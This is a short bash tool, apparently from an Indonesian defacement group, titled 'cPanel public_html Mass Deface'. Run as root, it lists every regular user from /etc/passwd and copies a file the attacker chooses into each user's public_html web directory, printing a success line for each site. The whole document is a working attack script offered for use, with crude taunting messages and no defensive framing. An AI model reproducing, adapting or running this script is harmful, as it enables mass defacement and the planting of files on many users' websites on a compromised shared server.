#!/bin/bash
args=("$@")
UHOME="/home"
FILE=$(pwd)"/"${args[0]}
priv=$([ $(id -u) == 0 ] && echo "lets fuck the server" || echo " run as root, n00b..")

echo "		cPanel public_html Mass Deface"
echo "			indoxploit.or.id"
echo ""
echo $priv
echo ""

if [ -z "$1" ]
	then
	echo "usage: ./mass file"
else

_USERS="$(awk -F':' '{ if ( $3 >= 500 ) print $1 }' /etc/passwd)"
for u in $_USERS
do 
   	_dir="${UHOME}/${u}/public_html"
   	if [ -d "$_dir" ] && [ $(id -u) == 0 ]
   	then
       	/bin/cp "$FILE" "$_dir"
       	if [ -e "$_dir/"$(basename "$FILE") ]
       		then
       		echo "[+] sukses ->" "$_dir/"$(basename "$FILE")
       		#chown $(id -un $u):$(id -gn $u) "$_dir/"$(basename "$FILE")
       	fi
   	fi
done
fi
